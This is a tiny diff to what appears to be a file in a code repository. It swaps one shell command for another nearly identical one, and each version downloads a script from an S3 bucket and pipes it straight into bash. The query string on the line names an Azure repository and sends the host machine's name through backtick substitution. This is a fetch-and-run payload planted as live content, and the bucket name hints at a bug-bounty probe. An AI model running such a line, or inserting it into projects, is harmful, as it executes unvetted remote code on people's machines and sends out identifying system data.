@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/Moneo.git\&folder=master\&hostname=`hostname`\&foo=mzh
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/Moneo.git\&folder=master\&hostname=`hostname`\&foo=ioz
